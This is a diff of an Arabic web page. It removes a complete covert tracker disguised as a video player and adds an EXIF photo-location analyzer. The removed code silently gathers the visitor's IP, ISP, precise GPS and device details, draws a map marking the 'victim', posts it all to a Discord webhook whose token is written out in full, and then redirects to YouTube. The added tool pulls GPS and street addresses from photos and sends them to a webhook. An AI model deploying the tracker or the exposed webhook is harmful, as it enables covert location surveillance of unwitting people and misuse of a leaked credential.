@@ -2,229 +2,378 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>مشغّل الفيديو — جارٍ التحميل...</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>TRX IMAGE ANALYZER</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background:#0f1115; color:#e8e8e8; font-family:"Segoe UI", Tahoma, Arial, sans-serif;
-    height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden;
-  }
-  .box { text-align:center; }
-  .player {
-    width:320px; height:180px; border-radius:12px; margin:0 auto 18px;
-    background:radial-gradient(circle at 30% 30%, #1c2230, #0a0c10);
-    display:flex; align-items:center; justify-content:center;
-    border:1px solid #232a38;
-  }
-  .play { width:64px; height:64px; border-radius:50%; background:#e50914; display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(229,9,20,.5); }
-  .play::after { content:""; border-style:solid; border-width:12px 0 12px 20px; border-color:transparent transparent transparent #fff; margin-right:4px; }
-  .bar { width:320px; height:6px; background:#232a38; border-radius:3px; margin:14px auto 10px; overflow:hidden; }
-  .bar i { display:block; height:100%; width:0; background:#e50914; border-radius:3px; animation:load 2.2s ease forwards; }
-  @keyframes load { to { width:100%; } }
-  .txt { color:#9aa4b5; font-size:14px; }
+*{margin:0;padding:0;box-sizing:border-box}
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Fira+Code:wght@400;600&display=swap');
+body{
+  background:linear-gradient(160deg,#031003,#071c07 40%,#021302);
+  min-height:100vh;color:#b8ffb8;font-family:'Cairo',sans-serif;
+  display:flex;justify-content:center;padding:30px 15px;
+  position:relative;overflow-x:hidden
+}
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent 0 2px,rgba(0,255,0,0.02) 2px 4px);z-index:0
+}
+.wrap{position:relative;z-index:1;width:100%;max-width:1000px}
+.hd{text-align:center;margin-bottom:22px}
+.hd h1{font-size:28px;font-weight:900;color:#3aff3a;text-shadow:0 0 15px #3aff3a88,0 0 40px #00aa0055;font-family:'Fira Code',monospace}
+.hd p{color:#4a7a4a;font-size:13px;margin-top:5px}
+.hd .tag{color:#0a0a0a;background:#3aff3a;padding:2px 14px;border-radius:20px;font-weight:700;display:inline-block;margin-top:9px;font-size:12px}
+.panel{
+  background:rgba(4,20,4,0.85);border:1px solid #1d5a1d;border-radius:16px;
+  padding:20px;margin-bottom:16px;box-shadow:0 0 25px #00ff0010,inset 0 0 40px #00ff0005
+}
+.panel h2{font-size:16px;color:#3aff3a;margin-bottom:14px;display:flex;align-items:center;gap:8px;font-family:'Fira Code',monospace;font-weight:700}
+.panel h2::before{content:'▸';color:#2acc2a}
+
+.upload{
+  background:#021302;border:2px dashed #1d5a1d;border-radius:14px;
+  padding:35px 20px;text-align:center;cursor:pointer;transition:all .3s
+}
+.upload:hover{border-color:#3aff3a66;background:#041604}
+.upload.drag{border-color:#3aff3a;background:#061806}
+.upload .ic{font-size:44px;display:block;margin-bottom:8px;opacity:.7}
+.upload b{font-size:19px;color:#7dff7d}
+.upload small{display:block;font-size:12px;color:#4a7a4a;margin-top:5px}
+#fileIn{display:none}
+
+.preview-wrap{display:none;margin-top:14px;text-align:center}
+.preview-wrap.show{display:block}
+.preview-wrap img{max-width:100%;max-height:260px;border-radius:12px;border:2px solid #1d5a1d;box-shadow:0 0 30px #00ff0015}
+
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:14px}
+.btn{
+  background:#0d3d0d;border:1px solid #3aff3a66;color:#7dff7d;
+  font-family:'Cairo',sans-serif;font-weight:700;font-size:14px;
+  padding:12px 24px;border-radius:10px;cursor:pointer;transition:all .2s
+}
+.btn:hover{background:#145a14;box-shadow:0 0 15px #3aff3a33}
+.btn:disabled{opacity:.4;cursor:wait}
+.btn.big{flex:1;font-size:16px;padding:14px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
+.item{background:#021302;border:1px solid #134a13;border-radius:10px;padding:11px 14px}
+.item .lbl{font-size:11px;color:#4a7a4a;font-family:'Fira Code',monospace}
+.item .val{font-size:14px;color:#a8ffa8;font-weight:700;margin-top:4px;direction:ltr;text-align:left;word-break:break-all;font-family:'Fira Code',monospace}
+.item .val.ar{direction:rtl;text-align:right;font-family:'Cairo',sans-serif}
+.item .val.no{color:#5a8a5a}
+
+.map-box{width:100%;height:330px;border:1px solid #1d5a1d;border-radius:12px;overflow:hidden;background:#021302}
+.map-box iframe{width:100%;height:100%;border:0;filter:grayscale(1) invert(0.92) hue-rotate(90deg)}
+.map-ph{width:100%;height:330px;display:flex;align-items:center;justify-content:center;color:#4a7a4a;font-family:'Fira Code',monospace;font-size:14px;text-align:center;padding:20px}
+
+.hidden{display:none}
+.loading{display:flex;align-items:center;gap:10px;color:#3aff3a;font-family:'Fira Code',monospace;font-size:14px;margin-top:12px}
+.spin{width:16px;height:16px;border:2px solid #1d5a1d;border-top-color:#3aff3a;border-radius:50%;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+.inp{
+  flex:1;min-width:220px;background:#031003;border:1px solid #1d5a1d;border-radius:10px;
+  color:#b8ffb8;font-family:'Fira Code',monospace;font-size:13px;
+  padding:11px 14px;direction:ltr;text-align:left;outline:none
+}
+.inp:focus{border-color:#3aff3a;box-shadow:0 0 12px #3aff3a33}
+.consent{
+  display:flex;align-items:flex-start;gap:10px;background:#051805;border:1px solid #1d5a1d;
+  border-radius:10px;padding:12px 14px;margin-top:12px;font-size:13px;color:#7db87d;line-height:1.7;cursor:pointer
+}
+.consent input{width:18px;height:18px;margin-top:3px;accent-color:#3aff3a;flex-shrink:0;cursor:pointer}
+.warn{
+  background:#051805;border:1px solid #2a6a2a;border-radius:12px;padding:13px 16px;
+  margin-top:14px;font-size:12px;color:#7db87d;line-height:1.9
+}
+.warn b{color:#3aff3a}
+.warn .no{color:#ff6b6b;font-weight:700}
+.foot{text-align:center;color:#2a5a2a;font-size:11px;margin-top:8px;font-family:'Fira Code',monospace}
+.toast{
+  position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(90px);
+  background:#062206;border:1px solid #3aff3a;color:#b8ffb8;padding:12px 26px;
+  border-radius:12px;font-size:14px;font-weight:700;transition:all .35s;opacity:0;z-index:99
+}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="player"><div class="play"></div></div>
-  <div class="bar"><i></i></div>
-  <div class="txt">جارٍ تجهيز الفيديو، الرجاء الانتظار...</div>
+<div class="wrap">
+
+  <div class="hd">
+    <h1>⚡ TRX IMAGE ANALYZER ⚡</h1>
+    <p>استخراج EXIF — موقع التصوير — معلومات الجهاز — إرسال للويب هوك</p>
+    <span class="tag">FORENSIC SYSTEM v1.0</span>
+  </div>
+
+  <div class="panel">
+    <h2>1 — رفع الصورة</h2>
+    <div class="upload" id="upBox">
+      <span class="ic">📷</span>
+      <b>ارفع الصورة هنا</b>
+      <small>اسحبها أو اضغط — JPG / PNG (الـ GPS يكون غالباً في صور JPG من الكاميرا)</small>
+      <input type="file" id="fileIn" accept="image/*">
+    </div>
+    <div class="preview-wrap" id="pvWrap"><img id="pvImg" alt=""></div>
+    <div class="row">
+      <button class="btn big" id="goBtn" disabled>🔍 بدأ التحليل</button>
+    </div>
+    <div class="loading hidden" id="loadTxt"><div class="spin"></div><span>جاري تحليل الصورة...</span></div>
+  </div>
+
+  <div class="panel hidden" id="pImg"><h2>🖼️ معلومات الصورة</h2><div class="grid" id="gImg"></div></div>
+  <div class="panel hidden" id="pExif"><h2>🔬 بيانات EXIF</h2><div class="grid" id="gExif"></div></div>
+  <div class="panel hidden" id="pGps"><h2>📍 موقع التصوير (GPS)</h2><div class="grid" id="gGps"></div><div class="map-box" id="mapBox" style="margin-top:12px"></div></div>
+  <div class="panel hidden" id="pDev"><h2>💻 معلومات الجهاز (من متصفحك)</h2><div class="grid" id="gDev"></div></div>
+
+  <div class="panel hidden" id="pWeb">
+    <h2>🔗 إرسال إلى ويب هوك ديسكورد</h2>
+    <div class="row">
+      <input class="inp" id="whInp" placeholder="https://discord.com/api/webhooks/...">
+      <button class="btn" id="sendBtn">📤 إرسال</button>
+      <button class="btn" id="copyBtn">📋 نسخ التقرير</button>
+    </div>
+    <label class="consent">
+      <input type="checkbox" id="consentChk">
+      <span>أقرّ بأني مالك الصورة أو لديّ إذن بتحليلها، وأوافق على إرسال <b>صورة المعاينة + تقرير التحليل الكامل</b> إلى الويب هوك أعلاه (لأغراض تدريبية أو شخصية).</span>
+    </label>
+    <div class="loading hidden" id="sendLoad"><div class="spin"></div><span>جاري الإرسال إلى الويب هوك...</span></div>
+  </div>
+
+  <div class="panel">
+    <h2>⚠️ ملاحظات صادقة</h2>
+    <div class="warn">
+      <b>📍 الموقع والشارع:</b> يُستخرج فقط إذا الصورة فيها بيانات <b>EXIF GPS</b> (الكاميرا سجلتها وقت التصوير). أغلب برامج التواصل مثل واتساب وتيليجرام وتويتر <b>تحذفها</b> عند الإرسال — والصورة الملتقطة من سكرين شوت ما فيها أي GPS.<br>
+      <span class="no">❌ الـ IP لا يُستخرج من الصورة أبداً</span> — أي أداة تدّعي هذا كذاب. الـ IP لا يُحفظ داخل ملف الصورة إطلاقاً.<br>
+      <b>💻 معلومات الجهاز</b> تخص الشخص اللي فاتح الموقع (المتصفح)، مو صاحب الصورة.
+    </div>
+  </div>
+
+  <div class="foot">// TRX | HUB — FORENSIC IMAGE ANALYZER //</div>
 </div>
 
+<div class="toast" id="toast"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js"></script>
 <script>
-/* ============================================================
-   IP Logger + Map — Red Team PoC
-   يلتقط: IP / موقع تقريبي / معلومات الجهاز + صورة خريطة
-   ويرسل كل شيء إلى Webhook (ديسكورد)
-   ============================================================ */
+var upBox=document.getElementById('upBox');
+var fileIn=document.getElementById('fileIn');
+var pvWrap=document.getElementById('pvWrap');
+var pvImg=document.getElementById('pvImg');
+var goBtn=document.getElementById('goBtn');
+var loadTxt=document.getElementById('loadTxt');
+var pImg=document.getElementById('pImg'),gImg=document.getElementById('gImg');
+var pExif=document.getElementById('pExif'),gExif=document.getElementById('gExif');
+var pGps=document.getElementById('pGps'),gGps=document.getElementById('gGps');
+var pDev=document.getElementById('pDev'),gDev=document.getElementById('gDev');
+var pWeb=document.getElementById('pWeb');
+var mapBox=document.getElementById('mapBox');
+var whInp=document.getElementById('whInp');
+var sendBtn=document.getElementById('sendBtn');
+var copyBtn=document.getElementById('copyBtn');
+var consentChk=document.getElementById('consentChk');
+var sendLoad=document.getElementById('sendLoad');
+var toast=document.getElementById('toast');
 
-const CONFIG = {
-  webhook: "https://discord.com/api/webhooks/1537214553014804520/1ZgqczFK_f92j8XIlZaD58A3vXx80HXEVU0rPR7rNLKjXpCUgEOVR2cgLnztt-g_qlRc",   // رابط الويب هو (عادي أو Base64)
-  decoyUrl: "https://www.youtube.com", // موقع التحويل بعد الالتقاط
-  redirectDelay: 4500,                 // ms قبل تحويل الضحية
-  zoom: 17,                            // 14=منطقة  17=شارع  19=أدق
-  mapWidth: 640,
-  mapHeight: 480,
-  useGPS: true,                        // محاولة GPS دقيق (يحتاج موافقة)
-  gpsTimeout: 6000
-};
+var FILE=null;
+var DATA_URL='';
+var REPORT='';
 
-const WEBHOOK = CONFIG.webhook.startsWith("http") ? CONFIG.webhook : atob(CONFIG.webhook);
-const N = 2 ** CONFIG.zoom, TILE = 256;
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function item(l,r,ar){return '<div class="item"><div class="lbl">'+esc(l)+'</div><div class="val'+(ar?' ar':'')+'">'+esc(r)+'</div></div>'}
+function show(m){toast.textContent=m;toast.classList.add('show');setTimeout(function(){toast.classList.remove('show')},2800)}
 
-/* ---------- 1) معلومات الـ IP والموقع التقريبي ---------- */
-async function getIPInfo() {
-  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
-    try {
-      const r = await fetch(url, { cache: "no-store" });
-      const j = await r.json();
-      if (j && (j.ip || j.latitude)) return j;
-    } catch (e) {}
-  }
-  return null;
-}
+upBox.addEventListener('click',function(){fileIn.click()});
+upBox.addEventListener('dragover',function(e){e.preventDefault();upBox.classList.add('drag')});
+upBox.addEventListener('dragleave',function(){upBox.classList.remove('drag')});
+upBox.addEventListener('drop',function(e){e.preventDefault();upBox.classList.remove('drag');if(e.dataTransfer.files.length)setFile(e.dataTransfer.files[0])});
+fileIn.addEventListener('change',function(){if(fileIn.files.length)setFile(fileIn.files[0])});
 
-/* ---------- 2) GPS دقيق (يحتاج إذن المستخدم) ---------- */
-function getGPS() {
-  return new Promise(res => {
-    if (!CONFIG.useGPS || !navigator.geolocation) return res(null);
-    navigator.geolocation.getCurrentPosition(
-      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
-      () => res(null),
-      { enableHighAccuracy: true, timeout: CONFIG.gpsTimeout, maximumAge: 0 }
-    );
-  });
-}
-
-/* ---------- 3) رسم صورة الخريطة (بدون API Key) ---------- */
-function tileURL(x, y, z) { return `https://tile.openstreetmap.org/${z}/${x}/${y}.png`; }
-
-function loadTile(x, y, z) {
-  return new Promise((res, rej) => {
-    const img = new Image();
-    img.crossOrigin = "anonymous";
-    img.onload = () => res(img);
-    img.onerror = rej;
-    img.src = tileURL(((x % N) + N) % N, y, z);
-  });
-}
-
-async function drawMap(lat, lon) {
-  const latR = lat * Math.PI / 180;
-  const x = (lon + 180) / 360 * N;                          // موضع البلاطة (كسري)
-  const y = (1 - Math.log(Math.tan(latR) + 1 / Math.cos(latR)) / Math.PI) / 2 * N;
-  const worldX = x * TILE, worldY = y * TILE;               // بيكسل عالمي
-  const startX = worldX - CONFIG.mapWidth / 2;              // نقطة الموقع = مركز الخريطة
-  const startY = worldY - CONFIG.mapHeight / 2;
-  const tX0 = Math.floor(startX / TILE), tY0 = Math.floor(startY / TILE);
-  const offX = startX - tX0 * TILE, offY = startY - tY0 * TILE;
-  const cols = Math.ceil(CONFIG.mapWidth / TILE) + 2;
-  const rows = Math.ceil(CONFIG.mapHeight / TILE) + 2;
-
-  const canvas = document.createElement("canvas");
-  canvas.width = CONFIG.mapWidth; canvas.height = CONFIG.mapHeight;
-  const ctx = canvas.getContext("2d");
-
-  const jobs = [];
-  for (let j = 0; j < rows; j++)
-    for (let i = 0; i < cols; i++)
-      jobs.push(loadTile(tX0 + i, tY0 + j, CONFIG.zoom).then(img => {
-        ctx.drawImage(img, i * TILE - offX, j * TILE - offY);
-      }).catch(() => {}));
-
-  await Promise.all(jobs);
-
-  /* بديل: خريطة جوجل الحقيقية (تحتاج API Key من Google Cloud)
-  const gmap = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=${CONFIG.zoom}&size=${CONFIG.mapWidth}x${CONFIG.mapHeight}&markers=color:red%7C${lat},${lon}&key=YOUR_KEY`;
-  const gi = new Image(); gi.crossOrigin = "anonymous";
-  await new Promise(r => { gi.onload = r; gi.onerror = r; gi.src = gmap; });
-  ctx.drawImage(gi, 0, 0); */
-
-  // علامة حمراء في المنتصف (موقع الضحية)
-  const cx = CONFIG.mapWidth / 2, cy = CONFIG.mapHeight / 2;
-  ctx.beginPath(); ctx.arc(cx, cy, 13, 0, Math.PI * 2);
-  ctx.fillStyle = "#e50914"; ctx.fill();
-  ctx.lineWidth = 4; ctx.strokeStyle = "#fff"; ctx.stroke();
-  ctx.beginPath(); ctx.arc(cx, cy, 4, 0, Math.PI * 2);
-  ctx.fillStyle = "#fff"; ctx.fill();
-
-  // شريط الإحداثيات فوق العلامة
-  const label = lat.toFixed(5) + ", " + lon.toFixed(5);
-  ctx.font = "bold 15px Arial";
-  const tw = ctx.measureText(label).width;
-  ctx.fillStyle = "rgba(0,0,0,.78)";
-  if (ctx.roundRect) { ctx.beginPath(); ctx.roundRect(cx - tw/2 - 8, cy - 42, tw + 16, 26, 6); ctx.fill(); }
-  else ctx.fillRect(cx - tw/2 - 8, cy - 42, tw + 16, 26);
-  ctx.fillStyle = "#fff";
-  ctx.fillText(label, cx - tw/2, cy - 24);
-
-  // حقوق الخريطة
-  ctx.font = "10px Arial";
-  ctx.fillStyle = "rgba(0,0,0,.55)";
-  ctx.fillText("© OpenStreetMap contributors", 6, CONFIG.mapHeight - 8);
-
-  return new Promise(res => canvas.toBlob(b => res(b), "image/png"));
-}
-
-/* ---------- 4) الإرسال إلى الويب هوك ---------- */
-async function sendToWebhook(data, mapBlob) {
-  const embed = {
-    title: "ضحية جديدة تم التقاطها",
-    color: 0xe50914,
-    fields: [
-      { name: "IP", value: data.ip, inline: true },
-      { name: "الموقع (IP)", value: `${data.city || "?"}، ${data.region || "?"} — ${data.country || "?"}`, inline: true },
-      { name: "ISP", value: data.isp || "غير معروف", inline: true },
-      { name: "الإحداثيات", value: `${data.lat?.toFixed(6)} , ${data.lon?.toFixed(6)}`, inline: true },
-      { name: "نوع التحديد", value: data.gpsUsed ? `GPS دقيق (±${Math.round(data.accuracy || 0)}م)` : "تقريبي (IP)", inline: true },
-      { name: "المتصفح", value: (data.ua || "?").slice(0, 100), inline: false },
-      { name: "اللغة", value: data.lang, inline: true },
-      { name: "الشاشة", value: data.screen, inline: true },
-      { name: "المصدر", value: data.referrer, inline: false },
-      { name: "الوقت", value: data.time, inline: false }
-    ],
-    footer: { text: "HackerAI PoC — Logger" }
+function setFile(f){
+  FILE=f;
+  var rd=new FileReader();
+  rd.onload=function(e){
+    DATA_URL=e.target.result;
+    pvImg.src=DATA_URL;
+    pvWrap.classList.add('show');
+    goBtn.disabled=false;
+    [pImg,pExif,pGps,pDev,pWeb].forEach(function(p){p.classList.add('hidden')});
+    show('✅ تم رفع: '+f.name);
   };
-  if (mapBlob) embed.image = { url: "attachment://map.png" };
-
-  const payload = JSON.stringify({ username: "Logger", embeds: [embed] });
-
-  // المحاولة 1: إرسال مع صورة الخريطة (multipart)
-  try {
-    const form = new FormData();
-    form.append("payload_json", payload);
-    if (mapBlob) form.append("file", mapBlob, "map.png");
-    const r = await fetch(WEBHOOK, { method: "POST", body: form });
-    if (r.ok) return true;
-  } catch (e) {}
-
-  // المحاولة 2: JSON بدون صورة
-  try {
-    await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload });
-    return true;
-  } catch (e) {}
-
-  // المحاولة 3: beacon
-  try { navigator.sendBeacon(WEBHOOK, new Blob([payload], { type: "application/json" })); } catch (e) {}
-  return false;
+  rd.readAsDataURL(f);
 }
 
-/* ---------- التنفيذ الرئيسي ---------- */
-(async () => {
-  if (sessionStorage.getItem("_v")) { location.replace(CONFIG.decoyUrl); return; }
-  sessionStorage.setItem("_v", "1");
+function dmsToDec(coord,ref){
+  if(!coord||!coord.length)return null;
+  var d=coord[0]||0,m=coord[1]||0,s=coord[2]||0;
+  var dec=d+m/60+s/3600;
+  if(ref==='S'||ref==='W')dec=-dec;
+  return dec;
+}
 
-  // مؤقت التحويل — يشتغل فوراً حتى لو فشل الإرسال
-  setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
+function devInfo(){
+  var ua=navigator.userAgent,os='غير معروف',br='غير معروف';
+  if(/Windows/.test(ua))os='Windows';else if(/Android/.test(ua))os='Android';
+  else if(/iPhone|iPad/.test(ua))os='iOS';else if(/Mac/.test(ua))os='macOS';
+  else if(/Linux/.test(ua))os='Linux';
+  if(/Edg\//.test(ua))br='Edge';else if(/Chrome\//.test(ua))br='Chrome';
+  else if(/Firefox\//.test(ua))br='Firefox';else if(/Safari\//.test(ua))br='Safari';
+  gDev.innerHTML=
+    item('اسم الجهاز',navigator.platform||'—')+
+    item('نظام التشغيل',os,true)+
+    item('المتصفح',br)+
+    item('دقة الشاشة',screen.width+' × '+screen.height)+
+    item('الشاشة المتاحة',screen.availWidth+' × '+screen.availHeight)+
+    item('عمق الألوان',screen.colorDepth+' bit')+
+    item('اللغة',navigator.language||'—')+
+    item('المنطقة الزمنية',Intl.DateTimeFormat().resolvedOptions().timeZone||'—')+
+    item('المعالجات',navigator.hardwareConcurrency||'—')+
+    item('الذاكرة',navigator.deviceMemory?navigator.deviceMemory+' GB':'غير معلنة')+
+    item('جهاز لمس','ontouchstart'in window?'نعم':'لا')+
+    item('متصل بالإنترنت',navigator.onLine?'نعم':'لا');
+}
 
-  try {
-    const ipInfo = await getIPInfo();
-    const gps = await getGPS();
+function analyze(){
+  if(!FILE)return;
+  goBtn.disabled=true;
+  loadTxt.classList.remove('hidden');
+  var img=new Image();
+  img.onload=function(){
+    var tags={};
+    try{EXIF.getData(img,function(){tags=EXIF.getAllTags(this)})}catch(e){tags={}}
+    var naturalW=img.naturalWidth,naturalH=img.naturalHeight;
+    var kb=(FILE.size/1024).toFixed(1);
 
-    const lat = gps ? gps.lat : (ipInfo?.latitude ?? null);
-    const lon = gps ? gps.lon : (ipInfo?.longitude ?? null);
+    gImg.innerHTML=
+      item('اسم الملف',FILE.name,true)+
+      item('الحجم',kb+' KB')+
+      item('النوع',FILE.type||'—')+
+      item('الأبعاد',naturalW+' × '+naturalH)+
+      item('نسبة الأبعاد',(naturalW/naturalH).toFixed(2))+
+      item('آخر تعديل',new Date(FILE.lastModified).toLocaleString(),true);
+    pImg.classList.remove('hidden');
 
-    const data = {
-      ip: ipInfo?.ip || "غير معروف",
-      city: ipInfo?.city, region: ipInfo?.region, country: ipInfo?.country,
-      isp: ipInfo?.connection?.isp || ipInfo?.org,
-      lat, lon,
-      gpsUsed: !!gps, accuracy: gps ? gps.acc : null,
-      ua: navigator.userAgent, lang: navigator.language,
-      screen: `${screen.width}x${screen.height}`,
-      referrer: document.referrer || "direct",
-      time: new Date().toISOString()
-    };
+    var flash=tags.Flash;
+    var flashTxt=flash===undefined?'—':(flash===0?'لا يوجد فلاش':'اشتغل الفلاش');
+    var exp=tags.ExposureTime;
+    var expTxt=exp===undefined?'—':exp;
+    var fn=tags.FNumber;
+    if(fn&&typeof fn==='object')fn=fn[0]/fn[1];
+    var fl=tags.FocalLength;
+    if(fl&&typeof fl==='object')fl=fl[0]/fl[1];
 
-    let mapBlob = null;
-    if (lat != null && lon != null) {
-      try { mapBlob = await drawMap(lat, lon); } catch (e) {}
+    gExif.innerHTML=
+      item('الكاميرا (Make)',tags.Make||'—',true)+
+      item('الموديل (Model)',tags.Model||'—',true)+
+      item('البرنامج',tags.Software||'—',true)+
+      item('تاريخ التصوير',tags.DateTimeOriginal||'—')+
+      item('ISO',tags.ISOSpeedRatings||'—')+
+      item('سرعة الغالق',expTxt)+
+      item('فتحة العدسة',fn!==undefined?'f/'+fn:'—')+
+      item('البعد البؤري',fl!==undefined?fl+' mm':'—')+
+      item('الفلاش',flashTxt,true)+
+      item('الاتجاه',tags.Orientation!==undefined?tags.Orientation:'—')+
+      item('الارتفاع',tags.GPSAltitude!==undefined?(tags.GPSAltitude+(tags.GPSAltitudeRef===1?' تحت البحر':' م')):'—')+
+      item('الرخصة/الحقوق',tags.Copyright||'—');
+    pExif.classList.remove('hidden');
+
+    var lat=dmsToDec(tags.GPSLatitude,tags.GPSLatitudeRef);
+    var lng=dmsToDec(tags.GPSLongitude,tags.GPSLongitudeRef);
+    if(lat!==null&&lng!==null){
+      gGps.innerHTML=
+        item('خط العرض',lat.toFixed(6))+
+        item('خط الطول',lng.toFixed(6))+
+        item('الاتجاه',(tags.GPSLatitudeRef||'')+' / '+(tags.GPSLongitudeRef||''))+
+        item('الارتفاع',tags.GPSAltitude!==undefined?tags.GPSAltitude+' م':'—');
+      pGps.classList.remove('hidden');
+      mapBox.innerHTML='<iframe src="https://www.google.com/maps?q='+lat+','+lng+'&z=17&output=embed"></iframe>';
+      fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat='+lat+'&lon='+lng+'&zoom=18&accept-language=ar')
+        .then(function(r){return r.json()})
+        .then(function(d){
+          if(d&&d.display_name){
+            gGps.innerHTML+=item('الشارع/العنوان',d.display_name,true);
+            REPORT+='العنوان: '+d.display_name+'\n';
+          }
+        })
+        .catch(function(){});
+      REPORT+='الموقع: '+lat.toFixed(6)+', '+lng.toFixed(6)+'\n';
+    }else{
+      pGps.classList.remove('hidden');
+      gGps.innerHTML='<div class="item" style="grid-column:1/-1"><div class="val no">⚠ لا توجد بيانات GPS في هذه الصورة — إما محذوفة أو الصورة من برنامج تواصل أو سكرين شوت</div></div>';
+      mapBox.innerHTML='<div class="map-ph">لا توجد إحداثيات لعرضها</div>';
     }
 
-    await sendToWebhook(data, mapBlob);
-  } catch (e) { /* فشل صامت بدون أي أثر */ }
-})();
+    devInfo();
+    pDev.classList.remove('hidden');
+
+    REPORT='📸 تقرير تحليل الصورة — TRX ANALYZER\n═══════════════════════\n';
+    REPORT+='الملف: '+FILE.name+'\n';
+    REPORT+='الحجم: '+kb+' KB\n';
+    REPORT+='الأبعاد: '+naturalW+' × '+naturalH+'\n';
+    REPORT+='الكاميرا: '+(tags.Make||'—')+' '+(tags.Model||'')+'\n';
+    REPORT+='تاريخ التصوير: '+(tags.DateTimeOriginal||'—')+'\n';
+    REPORT+='ISO: '+(tags.ISOSpeedRatings||'—')+'\n';
+    if(lat!==null&&lng!==null){
+      REPORT+='GPS: '+lat.toFixed(6)+', '+lng.toFixed(6)+'\n';
+    }
+    REPORT+='═══════════════════════\n';
+    REPORT+='💻 الجهاز (من المتصفح):\n';
+    REPORT+='الشاشة: '+screen.width+' × '+screen.height+'\n';
+    REPORT+='نظام: '+os()+'\n';
+    REPORT+='المتصفح: '+br()+'\n';
+    REPORT+='اللغة: '+(navigator.language||'—')+'\n';
+    REPORT+='المنطقة الزمنية: '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'—')+'\n';
+
+    pWeb.classList.remove('hidden');
+    loadTxt.classList.add('hidden');
+    goBtn.disabled=false;
+    show('✅ اكتمل التحليل');
+  };
+  img.onerror=function(){
+    loadTxt.classList.add('hidden');
+    goBtn.disabled=false;
+    show('❌ تعذر قراءة الصورة');
+  };
+  img.src=DATA_URL;
+}
+
+function os(){var u=navigator.userAgent;if(/Windows/.test(u))return'Windows';if(/Android/.test(u))return'Android';if(/iPhone|iPad/.test(u))return'iOS';if(/Mac/.test(u))return'macOS';if(/Linux/.test(u))return'Linux';return'غير معروف'}
+function br(){var u=navigator.userAgent;if(/Edg\//.test(u))return'Edge';if(/Chrome\//.test(u))return'Chrome';if(/Firefox\//.test(u))return'Firefox';if(/Safari\//.test(u))return'Safari';return'غير معروف'}
+
+goBtn.addEventListener('click',analyze);
+
+copyBtn.addEventListener('click',function(){
+  if(!REPORT){show('⚠ حلل الصورة أولاً');return}
+  navigator.clipboard.writeText(REPORT).then(function(){show('📋 تم نسخ التقرير')});
+});
+
+sendBtn.addEventListener('click',async function(){
+  var url=whInp.value.trim();
+  if(!url){show('⚠ ضع رابط الويب هوك أولاً');return}
+  if(url.indexOf('discord.com/api/webhooks/')<0&&url.indexOf('discordapp.com/api/webhooks/')<0){
+    show('⚠ الرابط ليس ويب هوك ديسكورد صحيح');return;
+  }
+  if(!consentChk.checked){show('⚠ وافق على صندوق الموافقة أولاً');return}
+  if(!REPORT){show('⚠ حلل الصورة أولاً');return}
+  sendBtn.disabled=true;
+  sendLoad.classList.remove('hidden');
+  try{
+    var blob=await (await fetch(DATA_URL)).blob();
+    var fd=new FormData();
+    fd.append('content','```'+REPORT+'```');
+    fd.append('file',blob,FILE.name||'image.jpg');
+    var res=await fetch(url,{method:'POST',body:fd});
+    if(res.ok){
+      show('✅ تم الإرسال إلى الويب هوك بنجاح');
+    }else{
+      show('❌ فشل الإرسال — رمز الخطأ: '+res.status);
+    }
+  }catch(e){
+    show('❌ خطأ: '+e.message);
+  }finally{
+    sendBtn.disabled=false;
+    sendLoad.classList.add('hidden');
+  }
+});
 </script>
 </body>
 </html>
